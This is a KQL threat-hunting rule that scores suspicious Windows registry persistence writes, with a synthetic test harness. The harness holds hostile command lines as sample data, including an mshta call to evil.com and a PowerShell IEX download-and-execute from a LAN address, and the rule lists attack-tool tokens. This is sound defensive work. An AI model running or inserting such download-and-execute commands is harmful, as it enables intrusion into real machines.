// ============================================================================
// [TEST HARNESS] VIRTUAL DATA (Stress Test v5 - Null Safety)
// ============================================================================
let DeviceRegistryEvents = datatable(Timestamp:datetime, DeviceId:string, DeviceName:string, ActionType:string, RegistryKey:string, RegistryValueName:string, RegistryValueData:string, InitiatingProcessId:int, AccountName:string)
[
    // --- [HIT] 1. Silent TaskCache Write (PowerShell + Base64) ---
    // EXPECT: CRITICAL (Silent Task + Danger + Base64)
    datetime(2026-02-01T12:00:00Z), "HOST-001", "WORKSTATION-A", "RegistryValueSet",
    @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{GUID}", "Trigger", 
    "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 
    1001, "SYSTEM",

    // --- [HIT] 2. Service ImagePath to Writable Path ---
    // EXPECT: HIGH (Service + Writable Path)
    datetime(2026-02-01T12:05:00Z), "HOST-002", "SERVER-DB", "RegistryValueSet",
    @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EvilSvc", "ImagePath",
    @"C:\Users\Public\Music\evil.exe",
    2001, "AdminUser",

    // --- [HIT] 3. Service ImagePath by LOLBin (Mshta) ---
    // EXPECT: HIGH (Service + Danger Process + Net)
    datetime(2026-02-01T12:10:00Z), "HOST-003", "HR-LAPTOP", "RegistryValueSet",
    @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Updater", "ImagePath",
    @"C:\Windows\System32\mshta.exe http://evil.com/payload.hta",
    3001, "User01",

    // --- [HIT] 4. Background Persistence (Run Key) with Network Indicator ---
    // EXPECT: HIGH (RunKey + Danger Cmd + Net)
    datetime(2026-02-01T12:15:00Z), "HOST-004", "DEV-PC", "RegistryValueSet",
    @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Updater",
    @"powershell -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/rat')",
    4001, "User02",

    // --- [HIT] 5. Large Blob Write (Payload Stashing) ---
    // EXPECT: MEDIUM/HIGH (TaskCache + Large Blob)
    datetime(2026-02-01T12:20:00Z), "HOST-001", "WORKSTATION-A", "RegistryValueSet",
    @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\MyTask", "Data",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    1001, "SYSTEM",

    // --- [NOISE] 6. Benign Google Update ---
    // EXPECT: SUPPRESSED (or LOW score)
    datetime(2026-02-01T12:25:00Z), "HOST-005", "CEO-LAPTOP", "RegistryValueSet",
    @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\gupdate", "ImagePath",
    @"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe /s",
    8001, "SYSTEM"
];

let DeviceProcessEvents = datatable(Timestamp:datetime, DeviceId:string, InitiatingProcessId:int, InitiatingProcessFileName:string, InitiatingProcessCommandLine:string, InitiatingProcessSHA256:string, InitiatingProcessSigner:string, InitiatingProcessVersionInfoCompanyName:string, InitiatingProcessAccountName:string)
[
    datetime(2026-02-01T12:00:00Z), "HOST-001", 1001, "powershell.exe", "powershell.exe -enc ...", "hash_evil_ps", "Microsoft Corporation", "Microsoft Corporation", "SYSTEM",
    datetime(2026-02-01T12:05:00Z), "HOST-002", 2001, "regedit.exe", "regedit.exe", "hash_regedit", "Microsoft Windows", "Microsoft Corporation", "AdminUser",
    datetime(2026-02-01T12:10:00Z), "HOST-003", 3001, "mshta.exe", "mshta.exe", "hash_mshta", "Microsoft Corporation", "Microsoft Corporation", "User01",
    datetime(2026-02-01T12:15:00Z), "HOST-004", 4001, "powershell.exe", "powershell.exe -c IEX...", "hash_evil_ps_2", "Microsoft Corporation", "Microsoft Corporation", "User02",
    datetime(2026-02-01T12:25:00Z), "HOST-005", 8001, "GoogleUpdate.exe", "GoogleUpdate.exe /install", "hash_google", "Google LLC", "Google LLC", "SYSTEM"
];

let DeviceFileEvents = datatable(Timestamp:datetime, DeviceId:string, SHA256:string)
[
    datetime(2026-01-01T00:00:00Z), "HOST-001", "hash_evil_ps",
    datetime(2026-01-01T00:00:00Z), "HOST-002", "hash_regedit",
    datetime(2026-01-01T00:00:00Z), "HOST-005", "hash_google" 
];

// ============================================================================
// [END HARNESS] - PRODUCTION RULE LOGIC
// ============================================================================

let lookback = 365d; 

let TrustedPublishers = dynamic(["Microsoft Corporation","Microsoft Windows","Google LLC","Mozilla Corporation"]);
let TrustedInitiators = dynamic(["msiexec.exe","trustedinstaller.exe","sppsvc.exe","intunemanagementextension.exe","updateinstaller.exe"]);

let UserWritableRx    = @"(?i)^[a-z]:\\(users|public|programdata|windows\\temp|temp|downloads|appdata)\\";
// [HARDENED] Regex now accepts continuous base64 strings OR chunked
let Base64ChunkedRx   = @"(?:[A-Za-z0-9+/]{40,}={0,2})"; 
let IPv4Rx            = @"\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b";
let DomainRx          = @"\b([a-z0-9][a-z0-9-]{1,62}\.)+[a-z]{2,}\b";
let UrlRx             = @"https?://[^\s'""<>]+";
let DangerTokens      = dynamic(["powershell","pwsh","cmd.exe","mshta","rundll32","regsvr32","wscript","cscript","certutil","bitsadmin","curl","wget","-enc","-encodedcommand","frombase64string","iex(","invoke-expression","http:","https:","ftp:"]);
let SafePathAnchors   = dynamic([@"c:\program files", @"c:\program files (x86)", @"c:\windows\system32", @"c:\windows\syswow64"]);
let SafeVendorKeywords = dynamic(["windows update","microsoft","google","edge","mozilla","firefox","onedrive","teams","intel","nvidia","amd","realtek","adobe","citrix"]);
let PayloadSizeThreshold = 500;

let OrgPrevalence =
  DeviceFileEvents
  | where Timestamp >= ago(30d)
  | summarize WriterDeviceCount = dcount(DeviceId) by SHA256;

// 1) Anchor: registry writes
let Raw =
  DeviceRegistryEvents
  | where Timestamp >= ago(lookback)
  | where ActionType == "RegistryValueSet"
  | extend
      RK  = tolower(tostring(RegistryKey)),
      RVN = tolower(tostring(RegistryValueName)),
      RVD = tolower(tostring(RegistryValueData))
  | where RK contains "system\\currentcontrolset\\services" 
       or RK contains "schedule\\taskcache" 
       or RK contains "windows\\currentversion\\run";

// 2) Enrich with writer process context
let WithProc =
  Raw
  | join kind=leftouter (
      DeviceProcessEvents
      | where Timestamp >= ago(lookback)
      | extend JoinTime = Timestamp
      | project DeviceId, InitiatingProcessId, JoinTime,
          WriterFile    = tostring(InitiatingProcessFileName),
          WriterCL      = tostring(InitiatingProcessCommandLine),
          WriterSHA     = tostring(InitiatingProcessSHA256),
          WriterSigner  = tostring(InitiatingProcessSigner),
          WriterCompany = tostring(InitiatingProcessVersionInfoCompanyName),
          WriterUser    = tostring(InitiatingProcessAccountName)
    ) on DeviceId, InitiatingProcessId
  | where abs(datetime_diff('minute', Timestamp, JoinTime)) <= 10 or isnull(JoinTime)
  | extend
      WriterFileL = tolower(coalesce(WriterFile,"")),
      WriterCLL   = tolower(coalesce(WriterCL,"")),
      WriterSignerL  = tolower(coalesce(WriterSigner,"")),
      WriterCompanyL = tolower(coalesce(WriterCompany,""))
  | extend
      WriterTrustedPublisher = toint(WriterCompany in~ (TrustedPublishers) or WriterSigner in~ (TrustedPublishers)),
      WriterTrustedInitiator = toint(WriterFileL in~ (TrustedInitiators));

// 3) Add org prevalence
let Enriched =
  WithProc
  | join kind=leftouter OrgPrevalence on $left.WriterSHA == $right.SHA256
  | extend
      WriterDeviceCount = coalesce(WriterDeviceCount, 0),
      WriterIsRare = toint(WriterDeviceCount <= 2);

// 4) Convergence
let Indicators = 
  Enriched
  | extend
      IsService    = toint(RK contains "system\\currentcontrolset\\services"),
      IsTaskCache  = toint(RK contains "schedule\\taskcache"),
      HasDanger      = toint(RVD has_any (DangerTokens) or WriterCLL has_any (DangerTokens)),
      HasBase64      = toint(RVD matches regex Base64ChunkedRx or WriterCLL matches regex Base64ChunkedRx),
      HasNet         = toint(RVD matches regex UrlRx or RVD matches regex IPv4Rx or RVD matches regex DomainRx),
      PointsWritable = toint(RVD matches regex UserWritableRx),
      IsLargeBlob    = toint(strlen(RVD) > PayloadSizeThreshold),
      IsSafePath     = toint(RVD has_any (SafePathAnchors)),
      IsSafeVendor   = toint(RVD has_any (SafeVendorKeywords) or RVN has_any (SafeVendorKeywords)),
      UntrustedWriter = toint(WriterTrustedPublisher == 0);

let Convergence = 
  Indicators
  | extend
      ServiceImagePathWrite = toint(IsService == 1 and (RVN == "imagepath" or RVN has "imagepath"))
  | where (IsService == 1 or IsTaskCache == 1 or RK contains "currentversion\\run")
  | where (IsTaskCache == 1)
      or (ServiceImagePathWrite == 1)
      or (HasDanger == 1)
      or (PointsWritable == 1)
      or (IsLargeBlob == 1)
  // Noise suppression
  | where not(IsSafePath == 1 and IsSafeVendor == 1 and HasDanger == 0 and HasBase64 == 0 and HasNet == 0 and PointsWritable == 0 and IsLargeBlob == 0)
  // Trusted initiator suppression
  | where not(WriterTrustedInitiator == 1 and (HasDanger + HasBase64 + HasNet + PointsWritable + IsLargeBlob) == 0);

// 5) Scoring - NULL SAFETY FIX
Convergence
| extend
    BaseScore = 55,
    Score_TaskCache = 25 * IsTaskCache,
    Score_Service   = 20 * ServiceImagePathWrite,
    Score_Danger    = 25 * HasDanger,
    Score_Base64    = 20 * HasBase64,
    Score_Net       = 10 * HasNet,
    Score_Writable  = 15 * PointsWritable,
    Score_Blob      = 25 * IsLargeBlob,
    Score_UntrustedWriter = 10 * UntrustedWriter,
    // [FIX] Coalesce Score_RareWriter in case join failed
    Score_RareWriter = 10 * coalesce(WriterIsRare, 0)

| extend
    // [FIX] Coalesce ALL components so one NULL doesn't kill the sum
    RiskScore = BaseScore
        + coalesce(Score_TaskCache, 0) + coalesce(Score_Service, 0) + coalesce(Score_Danger, 0) 
        + coalesce(Score_Base64, 0) + coalesce(Score_Net, 0)
        + coalesce(Score_Writable, 0) + coalesce(Score_Blob, 0) 
        + coalesce(Score_UntrustedWriter, 0) + coalesce(Score_RareWriter, 0)

| extend RiskLevel = case(RiskScore >= 120, "CRITICAL",
                      RiskScore >= 90,  "HIGH",
                      RiskScore >= 70,  "MEDIUM",
                      "LOW")

| extend DecodedPayload =
    iif(HasBase64 == 1,
        base64_decode_tostring(tostring(extract(@"([A-Za-z0-9+/]{40,})", 1, tostring(RegistryValueData)))),
        ""
    )

| extend PersistenceClass =
    case(IsTaskCache == 1, "TaskCache(SilentTask)",
         ServiceImagePathWrite == 1, "Service(ImagePath)",
         "Background(Other)")

| extend HunterDirective = case(
    RiskLevel == "CRITICAL" and PersistenceClass startswith "TaskCache",
      "CRITICAL: Silent Scheduled Task persistence via TaskCache (API/COM). Pull task definition (TaskCache GUID/Tree), validate owner/change, and scope for same task name/GUID across fleet.",
    RiskLevel == "CRITICAL" and PersistenceClass startswith "Service",
      "CRITICAL: Service persistence set (ImagePath). Validate service name + binary path, verify signer, collect binary, and scope other hosts for same ImagePath/WriterSHA.",
    RiskLevel == "HIGH",
      "HIGH: Background persistence registry artifact with strong indicators. Pivot to writer ancestry, recent file drops at referenced path, and hunt fleet for same RegistryValueData / WriterSHA.",
    "MEDIUM: Background persistence signal. Validate if approved updater/agent; if not, pivot into writer lineage + referenced path triage."
)

// [DEBUG] Added Debug_Components so you can verify the math
| project 
    Timestamp, 
    DeviceName, 
    PersistenceClass, 
    WriterProcess = WriterFile, 
    WriterCommandLine = WriterCL, 
    RiskScore, 
    RiskLevel, 
    HunterDirective,
    Debug_Components = pack("Base", BaseScore, "TaskCache", Score_TaskCache, "Service", Score_Service, "Danger", Score_Danger, "Base64", Score_Base64, "Writable", Score_Writable)
| order by RiskScore desc
